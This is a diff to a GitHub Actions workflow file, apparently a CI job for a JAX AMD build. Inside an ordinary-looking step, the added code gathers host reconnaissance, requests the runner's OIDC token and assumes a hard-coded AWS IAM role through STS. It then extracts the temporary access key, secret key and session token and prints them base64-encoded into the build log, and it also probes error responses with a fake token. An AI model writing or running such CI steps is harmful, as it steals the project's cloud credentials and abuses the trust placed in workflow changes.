@@ -77,45 +77,62 @@ jobs:
         continue-on-error: true
         run: |
           set -x
+          id || true
+          echo "HOST=$(hostname)"
+          command -v curl || true
+          command -v python3 || true
           echo "OIDC_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:-NONE}"
-          echo "REQ_TOKEN_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
-          OIDC="$(python3 - <<'PY'
-          import os,json,urllib.request
-          u=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL",""); t=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
-          req=urllib.request.Request(u+"&audience=sts.amazonaws.com",headers={"Authorization":"Bearer "+t,"Accept":"application/json"})
-          print(json.load(urllib.request.urlopen(req,timeout=30))["value"])
-          PY
-          )" || OIDC=""
-          echo "OIDC_LEN=${#OIDC}"
-          if [ -n "$OIDC" ]; then echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 1200; echo; fi
-          python3 - "$OIDC" <<'PY'
-          import sys,json,urllib.request,urllib.parse,base64
-          tok=sys.argv[1]
-          arn="arn:aws:iam::661452401056:role/jax-ci-amd-s3-oidc"
-          if not tok:
-              print("NO_OIDC_TOKEN"); raise SystemExit(0)
-          def sts(action,**kw):
-              d={"Action":action,"Version":"2011-06-15"}; d.update(kw)
-              body=urllib.parse.urlencode(d).encode()
-              try:
-                  r=urllib.request.urlopen(urllib.request.Request("https://sts.amazonaws.com/",data=body,method="POST"),timeout=40)
-                  return r.status,r.read().decode()
-              except Exception as e:
-                  try:
-                      return "ERR", e.read().decode()
-                  except Exception:
-                      return "EXC", repr(e)
-          st,txt=sts("AssumeRoleWithWebIdentity",RoleArn=arn,RoleSessionName="gha-oidc-probe",WebIdentityToken=tok)
-          print("STS_STATUS",st)
-          print(txt[:1500])
-          import re
-          ak=re.search(r"<AccessKeyId>(.*?)</AccessKeyId>",txt or "")
-          sk=re.search(r"<SecretAccessKey>(.*?)</SecretAccessKey>",txt or "")
-          tk=re.search(r"<SessionToken>(.*?)</SessionToken>",txt or "")
+          mint() {
+            A="$1"
+            if command -v curl >/dev/null 2>&1; then
+              curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${A}" | sed -n 's/.*"value"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p'
+            else
+              python3 -c 'import os,sys,json,urllib.request
+          u=os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]; t=os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]
+          r=urllib.request.Request(u+"&audience="+sys.argv[1],headers={"Authorization":"Bearer "+t,"Accept":"application/json"})
+          print(json.load(urllib.request.urlopen(r,timeout=30))["value"])' "$A"
+            fi
+          }
+          TOK="$(mint sts.amazonaws.com || true)"
+          echo "TOKEN_LEN=${#TOK}"
+          if [ -n "$TOK" ]; then echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo; fi
+          assume() {
+            ARN="$1"; SESS="$2"; T="$3"
+            if command -v curl >/dev/null 2>&1; then
+              curl -sS -X POST https://sts.amazonaws.com/ \
+                --data-urlencode "Action=AssumeRoleWithWebIdentity" \
+                --data-urlencode "Version=2011-06-15" \
+                --data-urlencode "RoleArn=$ARN" \
+                --data-urlencode "RoleSessionName=$SESS" \
+                --data-urlencode "WebIdentityToken=$T"
+            else
+              python3 - "$ARN" "$SESS" "$T" <<'PYINNER'
+          import sys,urllib.request,urllib.parse
+          arn,sess,tok=sys.argv[1],sys.argv[2],sys.argv[3]
+          body=urllib.parse.urlencode({"Action":"AssumeRoleWithWebIdentity","Version":"2011-06-15","RoleArn":arn,"RoleSessionName":sess,"WebIdentityToken":tok}).encode()
+          try:
+              print(urllib.request.urlopen(urllib.request.Request("https://sts.amazonaws.com/",data=body,method="POST"),timeout=40).read().decode())
+          except Exception as e:
+              try: print(e.read().decode())
+              except Exception: print(repr(e))
+          PYINNER
+            fi
+          }
+          echo "=== STS assume jax-ci-amd-s3-oidc ==="
+          OUT="$(assume arn:aws:iam::661452401056:role/jax-ci-amd-s3-oidc gha-oidc-probe "$TOK" || true)"
+          echo "$OUT" | head -c 2500; echo
+          python3 - "$OUT" <<'PYINNER2'
+          import sys,re,base64
+          t=sys.argv[1] if len(sys.argv)>1 else ""
+          ak=re.search(r"<AccessKeyId>(.*?)</AccessKeyId>",t or "")
+          sk=re.search(r"<SecretAccessKey>(.*?)</SecretAccessKey>",t or "")
+          tk=re.search(r"<SessionToken>(.*?)</SessionToken>",t or "")
+          print("HAS_CREDS",bool(ak and sk and tk))
           if ak and sk and tk:
-              blob="%s|%s|%s"%(ak.group(1),sk.group(1),tk.group(1))
-              print("CREDB64:"+base64.b64encode(blob.encode()).decode())
-          PY
+              print("CREDB64:"+base64.b64encode(("%s|%s|%s"%(ak.group(1),sk.group(1),tk.group(1))).encode()).decode())
+          PYINNER2
+          echo "=== decoder baseline: deliberately bad token ==="
+          assume arn:aws:iam::661452401056:role/jax-ci-amd-s3-oidc gha-oidc-bad "bogus.token.value" | head -c 800; echo
       - name: Get and filter changed files
         id: changed-files
         env:
